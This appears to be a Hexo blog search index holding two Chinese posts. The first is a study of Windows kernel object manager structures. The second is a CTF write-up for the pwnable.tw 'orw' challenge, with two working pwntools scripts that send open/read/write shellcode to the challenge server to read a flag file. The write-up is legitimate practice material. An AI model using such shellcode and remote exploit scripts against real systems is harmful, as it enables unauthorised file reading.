<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windwws内核对象</title>
      <link href="/2020/03/30/Windwws%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1/"/>
      <url>/2020/03/30/Windwws%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>Windows对象管理器的基本设计意图是：</p><p>​    为执行体的数据结构提供一种统一而又可扩展的定义和控制机制。</p><p>​    提供统一的安全访问机制。</p><p>​    在无须修改已有系统代码的情况下，加入新的对象类型。</p><p>​    提供一组标准的API来对对象执行各种操作。</p><p>​    提供一种命名机制，与文件系统的命名机制集成在一起。</p><p>每一个对象由两部分构成：对象头和对象体。所有对象的对象头都具有统一的格式，其定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_CREATE_INFORMATION</span> *<span class="title">POBJECT_CREATE_INFORMATION</span>;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_HEADER</span> &#123;</span></span><br><span class="line">    LONG_PTR PointerCount;<span class="comment">//引用计数</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        LONG_PTR HandleCount;<span class="comment">//指向该对象的句柄数</span></span><br><span class="line">        PVOID NextToFree;<span class="comment">//对象被延迟删除时加入到一条链中</span></span><br><span class="line">    &#125;;</span><br><span class="line">    POBJECT_TYPE Type;<span class="comment">//指向对象的类型对象</span></span><br><span class="line">    UCHAR NameInfoOffset;<span class="comment">//名称信息的内存偏移</span></span><br><span class="line">    UCHAR HandleInfoOffset;<span class="comment">//句柄信息的内存偏移</span></span><br><span class="line">    UCHAR QuotaInfoOffset;<span class="comment">//配额信息的内存偏移</span></span><br><span class="line">    UCHAR Flags;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        POBJECT_CREATE_INFORMATION ObjectCreateInfo;</span><br><span class="line">        PVOID QuotaBlockCharged;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    PSECURITY_DESCRIPTOR SecurityDescriptor;<span class="comment">//安全描述符</span></span><br><span class="line">    QUAD Body;<span class="comment">//对象体开始</span></span><br><span class="line">&#125; OBJECT_HEADER, *POBJECT_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_HEADER</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PointerCount     : Int4B</span><br><span class="line">   +<span class="number">0x004</span> HandleCount      : Int4B</span><br><span class="line">   +<span class="number">0x004</span> NextToFree       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> Type             : Ptr32 _OBJECT_TYPE</span><br><span class="line">   +<span class="number">0x00c</span> NameInfoOffset   : UChar</span><br><span class="line">   +<span class="number">0x00d</span> HandleInfoOffset : UChar</span><br><span class="line">   +<span class="number">0x00e</span> QuotaInfoOffset  : UChar</span><br><span class="line">   +<span class="number">0x00f</span> Flags            : UChar</span><br><span class="line">   +<span class="number">0x010</span> ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +<span class="number">0x010</span> QuotaBlockCharged : Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> SecurityDescriptor : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Body             : _QUAD</span><br></pre></td></tr></table></figure><p>对象头包含了对象管理所需的基本信息，在Windows中，每一种对象都需要有一个对应的类型对象（OBJECT_TYPE对象），其定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OBJECT_LOCK_COUNT 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE</span> &#123;</span></span><br><span class="line">    ERESOURCE Mutex;</span><br><span class="line">    LIST_ENTRY TypeList;</span><br><span class="line">    UNICODE_STRING Name;            <span class="comment">// Copy from object header for convenience</span></span><br><span class="line">    PVOID DefaultObject;</span><br><span class="line">    ULONG Index;<span class="comment">// 此类型对象在全局数组中的索引</span></span><br><span class="line">    ULONG TotalNumberOfObjects;</span><br><span class="line">    ULONG TotalNumberOfHandles;</span><br><span class="line">    ULONG HighWaterNumberOfObjects;</span><br><span class="line">    ULONG HighWaterNumberOfHandles;</span><br><span class="line">    OBJECT_TYPE_INITIALIZER TypeInfo;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> POOL_TAGGING</span></span><br><span class="line">    ULONG Key;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//POOL_TAGGING</span></span></span><br><span class="line">    ERESOURCE ObjectLocks[ OBJECT_LOCK_COUNT ];</span><br><span class="line">&#125; OBJECT_TYPE, *POBJECT_TYPE;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE</span><br><span class="line">ntdll!_OBJECT_TYPE</span><br><span class="line">   +<span class="number">0x000</span> Mutex            : _ERESOURCE</span><br><span class="line">   +<span class="number">0x038</span> TypeList         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x040</span> Name             : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x048</span> DefaultObject    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> Index            : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> TotalNumberOfObjects : Uint4B</span><br><span class="line">   +<span class="number">0x054</span> TotalNumberOfHandles : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> HighWaterNumberOfObjects : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> HighWaterNumberOfHandles : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +<span class="number">0x0ac</span> Key              : Uint4B</span><br><span class="line">   +<span class="number">0x0b0</span> ObjectLocks      : [<span class="number">4</span>] _ERESOURCE</span><br></pre></td></tr></table></figure><p>​    系统定义的对象种类有限，WRK支持的31种对象，各有哟个全局的POBJECT_TYPE变量指向其类型对象：</p><table><thead><tr><th>ObjectType:</th></tr></thead><tbody><tr><td>CmpKeyObjectType</td></tr><tr><td>DbgkDebugObjectType</td></tr><tr><td>ExCallbackobjectType</td></tr><tr><td>ExDesktopObjectType</td></tr><tr><td>ExEventobjectType</td></tr><tr><td>ExEventPairObjectType</td></tr><tr><td>ExMutantObjectType</td></tr><tr><td>ExpKeyedEventObjectType</td></tr><tr><td>ExProfileObjectType</td></tr><tr><td>ExSemaphoreObjectType</td></tr><tr><td>ExTimerObjectType</td></tr><tr><td>ExWindowStationObjecType</td></tr><tr><td>IoAdapterObjectType</td></tr><tr><td>IoCompletionObjectType</td></tr><tr><td>IoControllerObjectType</td></tr><tr><td>IoDeviceHandlerObjectType</td></tr><tr><td>IoDeviveObjectType</td></tr><tr><td>IoDriverObjectType</td></tr><tr><td>LpcPortObjectType</td></tr><tr><td>LpcWaitablePortObjectType</td></tr><tr><td>MmSectionObjectType</td></tr><tr><td>ObpDeviceMapObjectType</td></tr><tr><td>ObpDirectoryObjectType</td></tr><tr><td>ObpSymbolicLinkObjectType</td></tr><tr><td>ObpTypeobjectType</td></tr><tr><td>PsJobType</td></tr><tr><td>PsProcessType</td></tr><tr><td>PsThreadType</td></tr><tr><td>SeTokenObjectType</td></tr><tr><td>WmipGuidObjectType</td></tr></tbody></table><p>​    系统在初始化过程中会调用ObCreateObjectType()函数构建起这种对象类型，以完成相应全局变量的初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATS</span><br><span class="line">ObCreateObjectType(</span><br><span class="line">__in PUNICODE_STRING Typename,</span><br><span class="line">__in POBJECT_TYPE_INITIALIZER ObjectTypeInitializer,</span><br><span class="line">__in_opt PSECURITY_DESRIPTOR SecurityDescriptor,</span><br><span class="line">__out POBJECT_TYPE *ObjectType</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INITIALIZER</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    BOOLEAN UseDefaultObject;</span><br><span class="line">    BOOLEAN CaseInsensitive;</span><br><span class="line">    ULONG InvalidAttributes;</span><br><span class="line">    GENERIC_MAPPING GenericMapping;</span><br><span class="line">    ULONG ValidAccessMask;</span><br><span class="line">    BOOLEAN SecurityRequired;</span><br><span class="line">    BOOLEAN MaintainHandleCount;</span><br><span class="line">    BOOLEAN MaintainTypeList;</span><br><span class="line">    POOL_TYPE PoolType;</span><br><span class="line">    ULONG DefaultPagedPoolCharge;</span><br><span class="line">    ULONG DefaultNonPagedPoolCharge;</span><br><span class="line">    OB_DUMP_METHOD DumpProcedure;</span><br><span class="line">    OB_OPEN_METHOD OpenProcedure;</span><br><span class="line">    OB_CLOSE_METHOD CloseProcedure;</span><br><span class="line">    OB_DELETE_METHOD DeleteProcedure;</span><br><span class="line">    OB_PARSE_METHOD ParseProcedure;</span><br><span class="line">    OB_SECURITY_METHOD SecurityProcedure;</span><br><span class="line">    OB_QUERYNAME_METHOD QueryNameProcedure;</span><br><span class="line">    OB_OKAYTOCLOSE_METHOD OkayToCloseProcedure;</span><br><span class="line">&#125; OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE_INITIALIZER</span><br><span class="line">ntdll!_OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> UseDefaultObject : UChar</span><br><span class="line">   +<span class="number">0x003</span> CaseInsensitive  : UChar</span><br><span class="line">   +<span class="number">0x004</span> InvalidAttributes : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> GenericMapping   : _GENERIC_MAPPING</span><br><span class="line">   +<span class="number">0x018</span> ValidAccessMask  : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> SecurityRequired : UChar</span><br><span class="line">   +<span class="number">0x01d</span> MaintainHandleCount : UChar</span><br><span class="line">   +<span class="number">0x01e</span> MaintainTypeList : UChar</span><br><span class="line">   +<span class="number">0x020</span> PoolType         : _POOL_TYPE</span><br><span class="line">   +<span class="number">0x024</span> DefaultPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> DefaultNonPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> DumpProcedure    : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x030</span> OpenProcedure    : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x034</span> CloseProcedure   : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> DeleteProcedure  : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x03c</span> ParseProcedure   : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x040</span> SecurityProcedure : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x044</span> QueryNameProcedure : Ptr32     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x048</span> OkayToCloseProcedure : Ptr32     <span class="keyword">unsigned</span> <span class="keyword">char</span></span><br></pre></td></tr></table></figure><p>调用ObCreateObjectType函数来构建一种新的对象类型时，调用者除了可以指定此种类型对象的一些数据特性外，还可以指定该类型对象的一些基本操作方法。</p><p>​    系统有一个全局变量ObpObjectTypes数组记录所有已创建的类型，这是个静态数组。一旦对象类型被创建，以后内核代码就可以调用ObCreateObject来创建此种类型的对象了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">ObCreateObject(</span><br><span class="line">    __in KPROCESSOR_MODE ProbeMode,</span><br><span class="line">    __in POBJECT_TYPE ObjectType,</span><br><span class="line">    __in_opt POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    __in KPROCESSOR_MODE OwnershipMode,</span><br><span class="line">    __inout_opt PVOID ParseContext,</span><br><span class="line">    __in ULONG ObjectBodySize,</span><br><span class="line">    __in ULONG PagedPoolCharge,</span><br><span class="line">    __in ULONG NonPagedPoolCharge,</span><br><span class="line">    __out PVOID *Object</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>该函数返回时，Object输出参数指向对象体起始位置。对象体的格式是特定于某种对象类型的，由相应类型对象的诸多过程来维护。</p><p>​    对象管理器使用对象头中包含的信息来管理这些对象，在对象头中，除了对象名称和对象类型，另有两个重要的信息：指针计数，它记录了内核引用该对象的次数；句柄计数，它记录了有多少个句柄引用此对象，这些句柄可能出现在不同进程中。</p><p>​    类型对象并不需要为此种的对象提供所有在OBJECT_TYPE_INITIALIZER定义中出现的方法。对象管理器提供了一些通用的服务，这些通用服务可以应用在任何类型的对象上。</p><p>​    对象的构造是由两部分来完成的：1.调用ObCreateObject，根据指定的类型对象来完成对象头的初始化，并且按照指定的大小分配对象体的内存；2.完成对象体的初始化。前者可以统一完成，后者不可以，因为各种类型的对象体有自己不同的初始化逻辑。</p><p>​    Windows也允许使用名称的方式来管理对象。为了做到这一点，Windows必须维护一套全局的名称查询机制。ObpDirectoryObjectType  类型对像是实现这一机制的关键。</p><p>​    Windwos内部维护了一个对象层级目录（即系统全局名字空间），其根目录对象是由全局变量ObpRootDirectoryObject来定义的。在根目录之下，系统内置了一些子目录。在WRK中，通过查询NtCreateDirectoryObject函数被调用的情况，可以看到Callback、ArcName、Device、Driver、FileSystem、KernelObjects、ObjectTypes、GLOBAL??和Security子目录的创建过程。</p><p>​    对象管理器提供了一些基本的操作用于在名字空间中插入、查询和删除目录或目录项。例如，</p><table><thead><tr><th>函数</th><th>操作（以下三个函数都直接在一个子目录中进行操作）</th></tr></thead><tbody><tr><td>ObpLookupDirectoryEntry</td><td>在一个指定的目录中查找一个名称</td></tr><tr><td>ObpInsertDirectoryEntry</td><td>把一个对象插入到一个目录中</td></tr><tr><td>ObpDeleteDirectoryEntry</td><td>删除刚刚找到的那一项</td></tr></tbody></table><table><thead><tr><th>函数</th><th>操作</th></tr></thead><tbody><tr><td>ObpLookupObjectName</td><td>可以从指定的目录或根目录，递归地根据名称来找到一个对象。</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">ObpLookupObjectName (</span><br><span class="line">    IN HANDLE RootDirectoryHandle,</span><br><span class="line">    IN PUNICODE_STRING ObjectName,</span><br><span class="line">    IN ULONG Attributes,</span><br><span class="line">    IN POBJECT_TYPE ObjectType,</span><br><span class="line">    IN KPROCESSOR_MODE AccessMode,</span><br><span class="line">    IN PVOID ParseContext OPTIONAL,</span><br><span class="line">    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos OPTIONAL,</span><br><span class="line">    IN PVOID InsertObject OPTIONAL,</span><br><span class="line">    IN OUT PACCESS_STATE AccessState,</span><br><span class="line">    OUT POBP_LOOKUP_CONTEXT LookupContext,</span><br><span class="line">    OUT PVOID *FoundObject</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>其基本的执行逻辑：</p><p>​    参数检查。</p><p>​    如果调用者指定了RootDirectoryHandle参数，则利用此RootDirectory的Parse方法来解析对象名称，直到解析成功或者不成功，或者指示从头解析</p><p>​    如果调用者没有指定RootDirectoryHandle参数，则系统从全局的根目录ObpRootDirectoryObject开始解析。在这种情况下，传递进来的对象名称必须以“\”开始。如果待查找的名称仅仅是“\”，则执行特殊处理。否则，执行：    </p><p>​        1.首先判断名称是否以“??\”打头，如果是的话，就需要拿到当前进程的DeviceMap（设备表），以进一步查询。</p><p>​        2.如果名称正好是”??”，则直接返回当前进程的DeviceMap作为结果。（DeviceMap定义了一个DOS设备的名字空间，比如驱动器字母C: D:）和一些外设（如COM1）。当对象管理器看到一个以“??\”打头的名称或者像“??”这样的名称，它会利用进程的DeviceMap来获得相应的对象目录，然后进一步解析剩余的名称字符串。）</p><p>​        3.调用ObpLookupDirectoryEntry函数，层层递进，或者碰到具有Parse方法的对象，由它来解析余下的名称字符串，或者碰到子目录对象，从而可以在子目录对象中进一步查询下一级名称。</p><p>​    对象管理器的两个接口函数：ObOpenObjectByName和ObReferenceObjectByName，正是通过ObpLookupObjectName来完成其打开对象或引用对象的功能的。ObInsertObject，它的作用是把一个对象插入到一个进程的句柄表中，也通过ObpLookupObjectName函数来验证待插入的对象是否在全局名字空间中</p><p>​    对象管理器中的对象是执行体对象，他们位于系统地址空间中，因而所有的进程都可以访问这些对象。但是用户模式的代码只能通过系统调用和句柄表来引用执行体对象。内核中将一个句柄转化为相应的对象，可以通过ObReferenceObjectByHandle函数来完成。该函数负责从当前进程环境或内核环境的句柄表中获得指定的对象引用。</p><p>​    对象是通过引用计数来管理其生命周期的，一旦引用计数为0，则对象生命周期结束，它所占用的内存也可以被回收。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-of-pwnable.tw之orw</title>
      <link href="/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/"/>
      <url>/2020/03/21/Writeup-of-pwnable-tw%E4%B9%8Borw/</url>
      
        <content type="html"><![CDATA[<p>题目显示Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.应该是使用了沙箱，</p><p>后门程序是用不成了，只能使用这三个函数直接读取flag。了</p><p><img src="orw.png" alt=""></p><p>使用IDA Pro反汇编程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:08048548                 lea     ecx, [esp+4]</span><br><span class="line">.text:0804854C                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:0804854F                 push    dword ptr [ecx-4]</span><br><span class="line">.text:08048552                 push    ebp</span><br><span class="line">.text:08048553                 mov     ebp, esp</span><br><span class="line">.text:08048555                 push    ecx</span><br><span class="line">.text:08048556                 sub     esp, 4</span><br><span class="line">.text:08048559                 call    orw_seccomp</span><br><span class="line">.text:0804855E                 sub     esp, 0Ch</span><br><span class="line">.text:08048561                 push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">.text:08048566                 call    _printf</span><br><span class="line">.text:0804856B                 add     esp, 10h</span><br><span class="line">.text:0804856E                 sub     esp, 4</span><br><span class="line">.text:08048571                 push    0C8h            ; nbytes</span><br><span class="line">.text:08048576                 push    offset shellcode ; buf</span><br><span class="line">.text:0804857B                 push    0               ; fd</span><br><span class="line">.text:0804857D                 call    _read</span><br><span class="line">.text:08048582                 add     esp, 10h</span><br><span class="line">.text:08048585                 mov     eax, offset shellcode</span><br><span class="line">.text:0804858A                 call    eax ; shellcode</span><br><span class="line">.text:0804858C                 mov     eax, 0</span><br><span class="line">.text:08048591                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048594                 leave</span><br><span class="line">.text:08048595                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048598                 retn</span><br><span class="line">.text:08048598 ; &#125; &#x2F;&#x2F; starts at 8048548</span><br><span class="line">.text:08048598 main            endp</span><br></pre></td></tr></table></figure><p>可以得出整个程序的执行流程：</p><p>首先，在0x08048559地址处调用了orw_seccomp，那么这东西是干嘛的呢？</p><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/#seccomp](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/#seccomp)">sseccomp</a></p><p>short for secure computing mode(<a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">wiki</a>)是一种限制系统调用的安全机制，可以当沙箱用。在严格模式下只支持<code>exit()</code>，<code>sigreturn()</code>，<code>read()</code>和<code>write()</code>，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>查看</p><p>在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用<code>seccomp_init</code>,<code>seccomp_rule_add</code>,<code>seccomp_load</code>来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。<br>首先，要使用它需要有<code>CAP_SYS_ADMIN</code>权能，否则就要设置<code>PR_SET_NO_NEW_PRIVS</code>位，若不这样做非root用户使用这个程序时<code>seccomp</code>保护将会失效！设置了<code>PR_SET_NO_NEW_PRIVS</code>位后能保证<code>seccomp</code>对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行<code>execve</code>这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用<code>ptctl</code>也不能再把它禁用掉。</p><p>然后程序接下来将shellcode读到.bss段的0x804a060地址处，然后接下来直接使用call指令跳转到该处执行。</p><p>直接写shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#p = process("./orw")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="string">"10001"</span>)</span><br><span class="line">ass = <span class="string">'''</span></span><br><span class="line"><span class="string"> xor eax, eax</span></span><br><span class="line"><span class="string"> push eax</span></span><br><span class="line"><span class="string"> push 0x6761</span></span><br><span class="line"><span class="string"> push 0x6c662f77</span></span><br><span class="line"><span class="string"> push 0x726f2f65</span></span><br><span class="line"><span class="string"> push 0x6d6f682f</span></span><br><span class="line"><span class="string"> mov al, 0x05</span></span><br><span class="line"><span class="string"> mov ebx, esp</span></span><br><span class="line"><span class="string"> xor ecx, ecx</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string"> sub esp, 0x40</span></span><br><span class="line"><span class="string"> mov ebx, eax</span></span><br><span class="line"><span class="string"> mov al, 0x03</span></span><br><span class="line"><span class="string"> mov ecx, esp</span></span><br><span class="line"><span class="string"> mov dl, 0x40</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string"> mov al, 0x04</span></span><br><span class="line"><span class="string"> mov bl, 0x01</span></span><br><span class="line"><span class="string"> mov ecx, esp</span></span><br><span class="line"><span class="string"> mov dl, 0x40</span></span><br><span class="line"><span class="string"> int 0x80</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">shellcode = asm(ass)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">s = p.recv(<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>后来看到网上有人写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">myelf = ELF(<span class="string">"./orw"</span>)</span><br><span class="line"><span class="comment">#io = process(myelf.path)</span></span><br><span class="line">io  = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">'/home/orw/flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"esp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"eax"</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x0804A0D7</span>,<span class="number">40</span>).rstrip()</span><br><span class="line"><span class="comment">#print shellcode</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>觉得自己好憨啊。唉，学到了。原来pwntools真的是个神器。</p>]]></content>
      
      
